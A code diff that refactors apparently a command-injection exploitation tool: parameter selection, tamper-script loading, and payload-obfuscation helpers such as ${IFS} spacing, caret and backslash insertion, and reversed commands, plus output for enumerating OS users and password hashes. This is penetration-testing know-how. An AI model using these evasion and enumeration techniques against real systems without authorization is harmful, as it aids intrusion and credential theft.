+    settings.SKIP_PARAMETERS_LIST = parse_parameter_list(menu.options.skip_parameter)
 
 """
-Remove skipped parameters
+-p is an exclusive allowlist, --skip a blocklist, neither given tests everything.
 """
-def remove_skipped_params(url, check_parameters):
-  testable_parameters = list(set(check_parameters) - set(menu.options.skip_parameter.split(",")))
-  settings.TESTABLE_PARAMETERS_LIST = [x for x in testable_parameters if x not in settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST).split(settings.PARAMETER_SPLITTING_REGEX)]
-  _ = []
-  for parameter in check_parameters:
-    if parameter not in settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST).split(settings.PARAMETER_SPLITTING_REGEX):
-      _.append(parameter)
-  if _:    
-    info_msg = "Skipping " + check_http_method(url) + " parameter" + ('', 's')[len(_) > 1] + " '" + str(", ".join(_)) + "'."
-    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
-  menu.options.test_parameter = True
+def is_parameter_testable(name):
+  if settings.TESTABLE_PARAMETERS_LIST:
+    return name in settings.TESTABLE_PARAMETERS_LIST
+  if settings.SKIP_PARAMETERS_LIST:
+    return name not in settings.SKIP_PARAMETERS_LIST
+  return True
 
 """
-Identify and print non-listed parameters that were provided but not part of the testable list.
+Identify and print non-listed/skipped parameters that were provided but not part of the request.
 """
-def testable_parameters(url, check_parameters, header_name):
-  # Skip parameters if requested
-  if menu.options.skip_parameter is not None:
-    remove_skipped_params(url, check_parameters)
+def testable_parameters(url, check_parameters):
+  if settings.SKIP_PARAMETERS_LIST:
+    skipped = [p for p in check_parameters if p in settings.SKIP_PARAMETERS_LIST]
+    if skipped:
+      info_msg = "Skipping " + check_http_method(url) + " parameter" + ('', 's')[len(skipped) > 1] + " '" + ", ".join(skipped) + "'."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
 
-  if isinstance(settings.TESTABLE_PARAMETERS_LIST, list) and settings.TESTABLE_PARAMETERS_LIST:
-    raw_params = settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST)
-    normalized_params = raw_params.replace(settings.SINGLE_WHITESPACE, "")
-    testable_params = normalized_params.split(settings.PARAMETER_SPLITTING_REGEX)
-
-    non_listed_params = list(set(testable_params) - set(check_parameters))
-
-    # Determine testable state
+  if settings.TESTABLE_PARAMETERS_LIST:
     settings.TESTABLE_PARAMETERS = bool(
-      settings.TESTABLE_PARAMETERS or 
+      settings.TESTABLE_PARAMETERS or
       any(p in check_parameters for p in settings.TESTABLE_PARAMETERS_LIST)
     )
 
+    non_listed_params = [p for p in settings.TESTABLE_PARAMETERS_LIST if p not in check_parameters]
     if non_listed_params:
-      normalized_non_exist = settings.PARAMETER_SPLITTING_REGEX.join(non_listed_params)
-      normalized_non_exist = normalized_non_exist.replace(settings.SINGLE_WHITESPACE, "")
-      non_listed_params = normalized_non_exist.split(settings.PARAMETER_SPLITTING_REGEX)
-
       http_method = check_http_method(url)
-      if non_listed_params and http_method not in settings.METHODS_WITH_NON_LISTED_PARAMS:
+      if http_method not in settings.METHODS_WITH_NON_LISTED_PARAMS:
         settings.METHODS_WITH_NON_LISTED_PARAMS.append(http_method)
-        non_listed_params_items = ", ".join(non_listed_params)
         warn_msg = "Provided parameter" + ("s" if len(non_listed_params) != 1 else "") + " '"
-        warn_msg += non_listed_params_items + "'" + (" are", " is")[len(non_listed_params) == 1]
+        warn_msg += ", ".join(non_listed_params) + "'" + (" are", " is")[len(non_listed_params) == 1]
         warn_msg += " not inside the " + http_method + "."
         settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
-        
+
 """
 Lists available tamper scripts
 """
@@ -1758,12 +1789,7 @@ def list_tamper_scripts():
   settings.print_data_to_stdout(settings.print_info_msg(info_msg))
   
   if menu.options.list_tampers:
-    message = (
-      Style.BRIGHT
-      + "Available tamper scripts:"
-      + Style.RESET_ALL
-      + "\n"
-    )
+    message = ""
     
     for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
       with open(script, "rb") as script_file:
@@ -1771,16 +1797,14 @@ def list_tamper_scripts():
       match = re.search(r"About:(.*)\n", content)
       if match:
         comment = match.group(1).strip()
-        # Lowercase the first letter of the comment
-        comment = comment[0].lower() + comment[1:] if comment else comment
+        # Capitalize the first letter of the comment
+        comment = comment[0].upper() + comment[1:] if comment else comment
         script_name = os.path.basename(script)
         message += (
-          settings.SUB_CONTENT_SIGN_TYPE
-          + "Use '"
-          + Style.BRIGHT
+          Style.BRIGHT
           + script_name
           + Style.RESET_ALL
-          + "' that "
+          + " - "
           + comment
           + "\n"
         )
@@ -1800,8 +1824,7 @@ def tamper_dep_unix_only(tamper_name):
     return "Windows targets do not support the usage of '" + tamper_name + ".py'. Skipping tamper script."
 
 def tamper_dep_eval_incompatible(tamper_name):
-  eval_in_scope = len(menu.options.tech) == 0 or "e" in menu.options.tech
-  if eval_in_scope and settings.EVAL_BASED_STATE != False:
+  if settings.CURRENT_TECHNIQUE == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
     return "The dynamic code evaluation technique does not support the usage of '" + tamper_name + ".py'. Skipping tamper script."
 
 def tamper_dep_time_related_only(tamper_name):
@@ -1817,11 +1840,38 @@ def tamper_dep_interpreter_incompatible(tamper_name):
 Undo a per-character obfuscation (obf_char inserted before each letter) on any whole word that settings.IGNORE_TAMPER_TRANSFORMATION says must survive intact (e.g. shell keywords like 'if'/'then').
 """
 def tamper_restore_ignored_words(payload, obf_char):
-  for word in settings.IGNORE_TAMPER_TRANSFORMATION:
-    obf_word = obf_char.join(word[i:i+1] for i in range(-1, len(word), 1))
-    if obf_word in payload:
+  for word in sorted(settings.IGNORE_TAMPER_TRANSFORMATION, key=len, reverse=True):
+    obf_word = "".join(obf_char + char if re.match(settings.TAMPER_MODIFICATION_LETTERS, char) else char for char in word)
+    if obf_word != word and obf_word in payload:
       payload = payload.replace(obf_word, word)
-  return payload
+  whitespace = settings.WHITESPACES[0] if len(settings.WHITESPACES) != 0 else settings.SINGLE_WHITESPACE
+  pattern = r"\b(for|read)" + re.escape(whitespace) + r"((?:" + re.escape(obf_char) + r")?\w(?:(?:" + re.escape(obf_char) + r")?\w)*)"
+  return re.sub(pattern, lambda x: x.group(1) + whitespace + x.group(2).replace(obf_char, ""), payload)
+
+"""
+Apply a letter-modification regex only outside double-quoted spans (Windows/cmd.exe only) -
+caret (and similar per-letter escapes) has no effect inside double quotes, so applying it there
+just corrupts literal quoted text (e.g. "tokens=*", "powershell.exe ...") instead of obfuscating it.
+"""
+def tamper_modify_letters_outside_quotes(payload, repl):
+  parts = re.split(r'("[^"]*")', payload)
+  return "".join(part if part.startswith('"') else re.sub(settings.TAMPER_MODIFICATION_LETTERS, repl, part) for part in parts)
+
+"""
+Apply "transform" outside single-quoted spans only - single quotes suppress expansion, so anything injected there stays literal and corrupts the argument.
+"""
+def tamper_outside_single_quotes(payload, transform):
+  parts = re.split(r"('[^']*')", payload)
+  return "".join(part if part.startswith("'") else transform(part) for part in parts)
+
+"""
+Interleave obf_char before each tamper-modification-letter match (Unix-only) - the shared logic behind backslashes/dollaratsigns/singlequotes.
+"""
+def interleave_char_tamper(payload, obf_char):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return payload
+  payload = tamper_outside_single_quotes(payload, lambda part: re.sub(settings.TAMPER_MODIFICATION_LETTERS, lambda x: obf_char + x[0], part))
+  return tamper_restore_ignored_words(payload, obf_char)
 
 """
 base64encode/hexencode consume the whole payload as one blob, so they can't coexist with
@@ -1840,7 +1890,6 @@ def tamper_scripts(stored_tamper_scripts):
   if menu.options.tamper:
     # Check the provided tamper script(s)
     available_scripts = []
-    # Drop empty segments (trailing/double comma) and de-duplicate (preserving order) so a repeated name is validated, loaded, and reported only once.
     raw_scripts = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower())
     provided_scripts = list(dict.fromkeys(script.strip() for script in raw_scripts if script.strip()))
     for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
@@ -1853,16 +1902,18 @@ def tamper_scripts(stored_tamper_scripts):
         err_msg += "Use the '--list-tampers' option for listing available tamper scripts."
         settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
         raise SystemExit()
-    if not stored_tamper_scripts:
-      info_msg = "Loaded tamper script" + ('s', '')[len(provided_scripts) == 1] + ": "
-      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    for first, second in settings.INCOMPATIBLE_TAMPER_SCRIPTS:
+      if first in provided_scripts and second in provided_scripts:
+        err_msg = "Tamper script '" + first + "' is unlikely to work in combination with the tamper script '" + second + "'."
+        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+        raise SystemExit()
     priorities = {}
     for script in provided_scripts:
-      # Register each script once; duplicate entries would apply the same tamper twice.
       if script not in settings.MULTI_ENCODED_PAYLOAD:
         settings.MULTI_ENCODED_PAYLOAD.append(script)
       if not stored_tamper_scripts:
-        settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + script)
+        info_msg = "Loading tamper module '" + script + "'."
+        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
       try:
         module = importlib.import_module("src.core.tamper." + script)
       except (ImportError, ValueError):
@@ -1873,8 +1924,6 @@ def tamper_scripts(stored_tamper_scripts):
         settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
         raise SystemExit()
       priorities[script] = getattr(module, "__priority__", settings.PRIORITY.NORMAL)
-      # Each script declares its own incompatibilities via dependencies() (e.g. OS, active
-      # technique, other options) instead of a central list here having to track them all.
       warn_msg = module.dependencies() if hasattr(module, "dependencies") else None
       if warn_msg:
         # Always warn and drop incompatible scripts, including resumed techniques.
@@ -1904,6 +1953,17 @@ def tamper_scripts(stored_tamper_scripts):
       settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 """
+Enable a tamper script by name, skipping duplicates.
+"""
+def _enable_tamper_script(tamper_name):
+  if settings.TAMPER_SCRIPTS[tamper_name]:
+    return
+  provided = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower()) if menu.options.tamper else []
+  if tamper_name in provided:
+    return
+  menu.options.tamper = (menu.options.tamper + "," + tamper_name) if menu.options.tamper else tamper_name
+
+"""
 Check for modified whitespaces.
 """
 def whitespace_check(payload):
@@ -1916,38 +1976,22 @@ def whitespace_check(payload):
 
   # Enable the "space2ifs" tamper script.
   if "${IFS}" in _:
-    if not settings.TAMPER_SCRIPTS['space2ifs']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",space2ifs"
-      else:
-        menu.options.tamper = "space2ifs"
+    _enable_tamper_script('space2ifs')
     settings.WHITESPACES[0] = "${IFS}"
 
   # Enable the "space2plus" tamper script.
   elif "+" in _ and payload.count("+") >= 2:
-    if not settings.TAMPER_SCRIPTS['space2plus']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",space2plus"
-      else:
-        menu.options.tamper = "space2plus"
+    _enable_tamper_script('space2plus')
     settings.WHITESPACES[0] = "+"
 
   # Enable the "space2htab" tamper script.
   elif "%09" in _:
-    if not settings.TAMPER_SCRIPTS['space2htab']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",space2htab"
-      else:
-        menu.options.tamper = "space2htab"
+    _enable_tamper_script('space2htab')
     settings.WHITESPACES[0] = "%09"
 
   # Enable the "space2vtab" tamper script.
   elif "%0b" in _:
-    if not settings.TAMPER_SCRIPTS['space2vtab']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",space2vtab"
-      else:
-        menu.options.tamper = "space2vtab"
+    _enable_tamper_script('space2vtab')
     settings.WHITESPACES[0] = "%0b"
 
   # Default whitespace
@@ -1958,10 +2002,7 @@ def whitespace_check(payload):
   count_spaces = payload.count(settings.WHITESPACES[0])
   if count_spaces > 15:
     if not settings.TAMPER_SCRIPTS['multiplespaces']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",multiplespaces"
-      else:
-        menu.options.tamper = "multiplespaces"
+      _enable_tamper_script('multiplespaces')
       settings.WHITESPACES[0] = settings.WHITESPACES[0] * int(count_spaces / 2)
 
 """
@@ -1970,60 +2011,32 @@ Check for symbols (i.e "`", "^", "$@" etc) between the characters of the generat
 def other_symbols(payload):
   # Implemented check to replace each character in a user-supplied OS command with a random case.
   if payload.count("|tr \"[A-Z]\" \"[a-z]\"") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['randomcase']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",randomcase"
-      else:
-        menu.options.tamper = "randomcase"
+    _enable_tamper_script('randomcase')
 
   # Check for reversed (characterwise) user-supplied operating system commands.
   if payload.count("|rev") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['rev']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",rev"
-      else:
-        menu.options.tamper = "rev"
+    _enable_tamper_script('rev')
 
   # Check for (multiple) backticks (instead of "$()") for command substitution on the generated payloads.
   if payload.count("`") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['backticks']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",backticks"
-      else:
-        menu.options.tamper = "backticks"
+    _enable_tamper_script('backticks')
     settings.USE_BACKTICKS = True
 
   # Check for caret symbol
   if payload.count("^") >= 10:
-    if not settings.TAMPER_SCRIPTS['caret']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",caret"
-      else:
-        menu.options.tamper = "caret"
+    _enable_tamper_script('caret')
 
   # Check for dollar sign followed by an at-sign
   if payload.count("$@") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['dollaratsigns']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",dollaratsigns"
-      else:
-        menu.options.tamper = "dollaratsigns"
+    _enable_tamper_script('dollaratsigns')
 
   # Check for uninitialized variable
   if len(re.findall(r'\${.*?}', payload)) >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['uninitializedvariable']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",uninitializedvariable"
-      else:
-        menu.options.tamper = "uninitializedvariable"
+    _enable_tamper_script('uninitializedvariable')
 
   # Check for environment variable value variable
   if payload.count("${PATH%%u*}") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['slash2env']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",slash2env"
-      else:
-        menu.options.tamper = "slash2env"
+    _enable_tamper_script('slash2env')
 
 """
 Check for (multiple) added back slashes between the characters of the generated payloads.
@@ -2031,11 +2044,7 @@ Check for (multiple) added back slashes between the characters of the generated 
 def check_backslashes(payload):
   # Check for single quotes
   if payload.count("\\") >= 15 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['backslashes']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",backslashes"
-      else:
-        menu.options.tamper = "backslashes"
+    _enable_tamper_script('backslashes')
 
 """
 Check for quotes in the generated payloads.
@@ -2043,27 +2052,15 @@ Check for quotes in the generated payloads.
 def check_quotes(payload):
   # Check for double quotes around of the generated payloads.
   if payload.endswith("\"") and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['nested']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",nested"
-      else:
-        menu.options.tamper = "nested"
+    _enable_tamper_script('nested')
 
   # Check for (multiple) added double-quotes between the characters of the generated payloads.
   if payload.count("\"") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['doublequotes']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",doublequotes"
-      else:
-        menu.options.tamper = "doublequotes"
+    _enable_tamper_script('doublequotes')
 
   # Check for (multiple) added single-quotes between the characters of the generated payloads.
   if payload.count("''") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['singlequotes']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",singlequotes"
-      else:
-        menu.options.tamper = "singlequotes"
+    _enable_tamper_script('singlequotes')
 
 """
 Charset matches alone do not prove encoding; require a mostly printable decoded result to confirm a real encoding.
@@ -2164,7 +2161,6 @@ def check_encoders(payload):
         pass
 
   if is_decoded and (encoded_with + "encode") in settings.MULTI_ENCODED_PAYLOAD:
-    # Keep menu.options.tamper in sync with auto-detected tampers so resumed sessions restore them.
     tamper_name = encoded_with + "encode"
     provided = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower()) if menu.options.tamper else []
     if tamper_name not in provided:
@@ -2180,18 +2176,10 @@ Recognise the payload.
 """
 def recognise_payload(payload):
   if "usleep" in payload and settings.TARGET_OS != settings.OS.WINDOWS:
-    if not settings.TAMPER_SCRIPTS['sleep2usleep']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",sleep2usleep"
-      else:
-        menu.options.tamper = "sleep2usleep"
+    _enable_tamper_script('sleep2usleep')
 
   elif "timeout" in payload:
-    if not settings.TAMPER_SCRIPTS['sleep2timeout']:
-      if menu.options.tamper:
-        menu.options.tamper = menu.options.tamper + ",sleep2timeout"
-      else:
-        menu.options.tamper = "sleep2timeout"
+    _enable_tamper_script('sleep2timeout')
 
   return check_encoders(payload)
   
@@ -2230,9 +2218,7 @@ def perform_payload_modification(payload):
   except IndexError:
     settings.RAW_PAYLOAD = payload
 
-  # tamper_scripts() already sorts scripts by declared __priority__; apply them in that order.
   for script in list(settings.MULTI_ENCODED_PAYLOAD):
-    # "xforwardedfor" mutates request headers, not the payload string - applied directly in headers.do_check(), nothing to do here.
     if script == 'xforwardedfor':
       continue
     module = importlib.import_module("src.core.tamper." + script)
@@ -2288,7 +2274,7 @@ def no_parameters_found():
   err_msg = "No parameter(s) found for testing in the provided data "
   err_msg += "(e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). "
   if not menu.options.crawldepth:
-    err_msg += "Rerun with '--crawl=2'."
+    err_msg += "Re-run with '--crawl=2'."
   settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
   raise SystemExit()
 
@@ -2350,7 +2336,7 @@ def is_XML_check(parameter):
   try:
     if re.search(settings.XML_RECOGNITION_REGEX, parameter):
       return True
-  except ValueError as err_msg:
+  except ValueError:
     return False
 
 #Check if INJECT_TAG is enclosed in quotes (in json data)
@@ -2415,7 +2401,6 @@ def check_similarities(all_params):
           if settings.SINGLE_WHITESPACE in flat[param]:
             flat[param] = flat[param].replace(settings.SINGLE_WHITESPACE, _)
             modified = True
-      # Re-dump only on a real collision (avoids corrupting nested bodies).
       if modified:
         all_params = [x.replace(settings.SINGLE_WHITESPACE, "").replace(_, settings.SINGLE_WHITESPACE) for x in json.dumps(flat).split(", ")]
     except Exception:
@@ -2465,11 +2450,7 @@ def print_ps_version(ps_version, filename, _):
     # Output PowerShell's version number
     info_msg = "Powershell version: " + ps_version
     settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-    # Add infos to logs file.
-    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-      if not menu.options.no_logging:
-        info_msg = "Powershell version: " + ps_version + settings.END_LINE.LF
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    logs.add_line(filename, info_msg, group="info")
   except ValueError:
     warn_msg = "Failed to identify the version of Powershell, "
     warn_msg += "which means some payloads or injection techniques may fail."
@@ -2486,11 +2467,7 @@ def print_hostname(shell, filename, _):
       settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     info_msg = "Hostname: " +  str(shell)
     settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-    # Add infos to logs file.
-    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-      if not menu.options.no_logging:
-        info_msg = info_msg + settings.END_LINE.LF
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    logs.add_line(filename, info_msg, group="info")
   else:
     warn_msg = "Failed to identify the hostname."
     settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
@@ -2504,11 +2481,7 @@ def print_current_user(cu_account, filename, _):
       settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     info_msg = "Current user: " +  str(cu_account)
     settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-    # Add infos to logs file.
-    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-      if not menu.options.no_logging:
-        info_msg = info_msg + settings.END_LINE.LF
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    logs.add_line(filename, info_msg, group="info")
   else:
     warn_msg = "Failed to fetch the current user."
     settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
@@ -2527,11 +2500,7 @@ def print_current_user_privs(shell, filename, _):
 
   info_msg = "Current user has elevated privileges: " +  str(priv)
   settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-  # Add infos to logs file.
-  with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-    if not menu.options.no_logging:
-      info_msg = info_msg + settings.END_LINE.LF
-      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  logs.add_line(filename, info_msg, group="info")
 """
 Print OS info
 """
@@ -2541,11 +2510,7 @@ def print_os_info(target_os, target_arch, filename, _):
       settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     info_msg = "Operating system: " +  str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch)
     settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-    # Add infos to logs file.
-    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-      if not menu.options.no_logging:
-        info_msg = info_msg + settings.END_LINE.LF
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    logs.add_line(filename, info_msg, group="info")
   else:
     warn_msg = "Failed to fetch underlying operating system information."
     settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
@@ -2575,16 +2540,11 @@ class print_enumenation():
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
 
   def print_users_msg(self):
-    if settings.TARGET_OS == settings.OS.WINDOWS:
-      info_msg = "Executing the 'net user' command "
-    else:
-      info_msg = "Fetching contents of the file '" + settings.PASSWD_FILE + "' "
-    info_msg += "to enumerate operating system users. "
+    info_msg = "Fetching operating system users. "
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
 
   def print_passes_msg(self):
-    info_msg = "Fetching contents of the file '" + settings.SHADOW_FILE + "' "
-    info_msg += "to enumerate operating system users password hashes. "
+    info_msg = "Fetching operating system users password hashes. "
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
 
   def print_single_os_cmd_msg(self, cmd):
@@ -2592,9 +2552,28 @@ class print_enumenation():
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
 
 """
-Print users enumeration.
+Classify a uid into a human-readable privilege label, mirroring '/etc/passwd' conventions.
+"""
+def classify_uid(uid):
+  uid = int(uid)
+  if uid == 0:
+    return "root user"
+  elif 0 < uid < 99:
+    return "system user"
+  elif 99 <= uid <= 65534:
+    if uid in (99, 60001, 65534):
+      return "anonymous user"
+    elif uid == 60002:
+      return "non-trusted user"
+    else:
+      return "regular user"
+  return ""
+
+"""
+Print users enumeration: a bare '* name' list, plus a per-user privileges section when requested.
 """
 def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter):
+
   # Windows users enumeration.
   if settings.TARGET_OS == settings.OS.WINDOWS:
     try:
@@ -2607,25 +2586,14 @@ def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whi
         if len(sys_users_list) != 0 :
           if settings.VERBOSITY_LEVEL == 0 and _:
             settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-          info_msg = "Identified operating system"
+          info_msg = "Operating system"
           info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
           info_msg += " [" + str(len(sys_users_list)) + "]:"
-          settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-          # Add infos to logs file.
-          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-            if not menu.options.no_logging:
-              output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-          count = 0
-          for user in range(0, len(sys_users_list)):
-            count = count + 1
-            is_privileged = is_privileged = ""
-            settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL)
-            # Add infos to logs file.
-            with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-              if not menu.options.no_logging:
-                if count == 1 :
-                  output_file.write(settings.END_LINE.LF)
-                output_file.write("(" +str(count)+ ") '" + sys_users_list[user] + is_privileged + "'" + settings.END_LINE.LF )
+          settings.print_data_to_stdout(info_msg)
+          logs.add_line(filename, info_msg, group="users")
+          for name in sys_users_list:
+            settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + name)
+            logs.add_line(filename, "  * " + name, group="users")
       else:
         warn_msg = "It seems you do not have permission to enumerate operating system users."
         settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
@@ -2652,9 +2620,7 @@ def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whi
           settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
           sys_users = " ".join(str(p) for p in sys_users).strip()
           settings.print_data_to_stdout(sys_users)
-          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-            if not menu.options.no_logging:
-              output_file.write("      " + sys_users)
+          logs.add_line(filename, "      " + sys_users, group="users")
         else:
           sys_users_list = []
           for user in range(0, len(sys_users), 3):
@@ -2662,64 +2628,47 @@ def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whi
           if len(sys_users_list) != 0 :
             if settings.VERBOSITY_LEVEL == 0 and _:
               settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-            info_msg = "Identified operating system"
+            info_msg = "Operating system"
             info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
             info_msg += " [" + str(len(sys_users_list)) + "]:"
-            settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-            # Add infos to logs file.
-            with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-              if not menu.options.no_logging:
-                output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+            settings.print_data_to_stdout(Style.BRIGHT + info_msg + Style.RESET_ALL)
+            logs.add_line(filename, info_msg, group="users")
+
+            parsed_users = []
             count = 0
             for user in range(0, len(sys_users_list)):
-              sys_users = sys_users_list[user]
-              sys_users = ":".join(str(p) for p in sys_users)
+              entry = ":".join(str(p) for p in sys_users_list[user])
               count = count + 1
-              fields = sys_users.split(":")
-              # System users privileges enumeration
+              fields = entry.split(":")
               try:
                 if not fields[2].startswith("/"):
                   raise ValueError()
-                if menu.options.privileges:
-                  if int(fields[1]) == 0:
-                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " root user "
-                    is_privileged_nh = " is root user "
-                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
-                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " system user "
-                    is_privileged_nh = " is system user "
-                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
-                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
-                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " anonymous user "
-                      is_privileged_nh = " is anonymous user "
-                    elif int(fields[1]) == 60002:
-                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " non-trusted user "
-                      is_privileged_nh = " is non-trusted user "
-                    else:
-                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " regular user "
-                      is_privileged_nh = " is regular user "
-                  else :
-                    is_privileged = ""
-                    is_privileged_nh = ""
-                else :
-                  is_privileged = ""
-                  is_privileged_nh = ""
-                settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "' " + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.")
-                # Add infos to logs file.
-                with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-                  if not menu.options.no_logging:
-                    if count == 1 :
-                      output_file.write(settings.END_LINE.LF)
-                    output_file.write("(" +str(count)+ ") '" + fields[0] + "' " + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'." + settings.END_LINE.LF)
+                parsed_users.append((fields[0], fields[1], fields[2]))
+                settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + fields[0])
+                logs.add_line(filename, "  * " + fields[0], group="users")
               except ValueError:
                 if count == 1 :
